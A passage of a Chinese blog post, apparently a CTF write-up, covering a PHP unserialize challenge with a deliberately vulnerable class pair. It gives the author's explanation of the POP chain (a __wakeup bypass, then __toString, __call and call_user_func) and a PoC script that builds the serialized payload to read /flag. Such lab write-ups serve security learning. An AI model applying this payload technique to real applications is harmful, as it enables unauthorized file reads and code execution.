class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="DEMO3"><a href="#DEMO3" class="headerlink" title="DEMO3"></a>DEMO3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">  public $a;</span><br><span class="line">  private $b;</span><br><span class="line">  protected $c;</span><br><span class="line">  public function __construct($a, $b, $c)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;a = $a;</span><br><span class="line">    $this-&gt;b = $b;</span><br><span class="line">    $this-&gt;c = $c;</span><br><span class="line">  &#125;</span><br><span class="line">  protected function flag()</span><br><span class="line">  &#123;</span><br><span class="line">    echo file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __call($name, $arguments)</span><br><span class="line">  &#123;</span><br><span class="line">    call_user_func([$name, $arguments[0]]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">    return &#x27;this a:&#x27; . $this-&gt;a;</span><br><span class="line">  &#125;</span><br><span class="line">  public function __wakeup()</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;a = 1;</span><br><span class="line">    $this-&gt;b = 2;</span><br><span class="line">    $this-&gt;c = 3;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">  public $a;</span><br><span class="line">  private $b;</span><br><span class="line">  protected $c;</span><br><span class="line">  public function __construct($a, $b, $c)</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;a = $a;</span><br><span class="line">    $this-&gt;b = $b;</span><br><span class="line">    $this-&gt;c = $c;</span><br><span class="line">  &#125;</span><br><span class="line">  public function b()</span><br><span class="line">  &#123;</span><br><span class="line">    echo $this-&gt;b;</span><br><span class="line">  &#125;</span><br><span class="line">  public function __toString()</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;a-&gt;a($this-&gt;b);</span><br><span class="line">    return &#x27;this is B&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;str&#x27;]))</span><br><span class="line">  unserialize($_GET[&#x27;str&#x27;]);</span><br></pre></td></tr></table></figure>
+<ol>
+<li>这题比较简单，只有两个类，类A中有读取flag文件的方法flag()，还有wakeup方法，起点基本就是类A</li>
+<li>这里A类里有wakeup魔术方法会对A类下面的属性赋值，所以需要绕过，绕过很简单。属性的数量加1即可，然后destruct魔术方法返回了”this a:”与A类下的属性a的值进行拼接</li>
+<li>如果属性a的值为一个对象，会触发tostring魔术方法，刚好B类中有这个魔术方法，并且调用了B类中的属性A的a方法，如果有call魔术方法会进行调用，恰好A类中有call魔术方法。</li>
+<li>call返回了call_user_func()函数，这里我看了半天没看明白，最后的在别的师傅的指导下我看明白了，[arguments[0]]就是arguments[0]，也就是说我们如果要调用这个flag,需要name==A，$arguments[0]==flag.构造poc即可<br>POC</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">  public $a;</span><br><span class="line">  private $b;</span><br><span class="line">  protected $c; </span><br><span class="line">&#125;</span><br><span class="line">class B</span><br><span class="line">&#123;</span><br><span class="line">  public $a;</span><br><span class="line">  private $b;</span><br><span class="line">  protected $c;</span><br><span class="line">  public function __construct()</span><br><span class="line">  &#123;</span><br><span class="line">    $this-&gt;b=&#x27;flag&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$t=new A();</span><br><span class="line">$s=new B();</span><br><span class="line">$s-&gt;a=$t;</span><br><span class="line">$t-&gt;a=$s;</span><br><span class="line">$p=serialize($t);</span><br><span class="line">$p=str_replace(&#x27;A&quot;:3&#x27;,&#x27;A&quot;:4&#x27;,$p);</span><br><span class="line">echo $p;</span><br><span class="line">echo &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line">echo urlencode($p);</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id><a href="#" class="headerlink" title></a></h2>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/29/linux/Windows%E6%8F%90%E6%9D%83%E7%AC%94%E8%AE%B0/" rel="prev" title="Windos提权笔记">
+                  <i class="fa fa-chevron-left"></i> Windos提权笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/09/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EPop%E9%93%BE/" rel="next" title="php反序列化与pop链">
+                  php反序列化与pop链 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0gekong</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
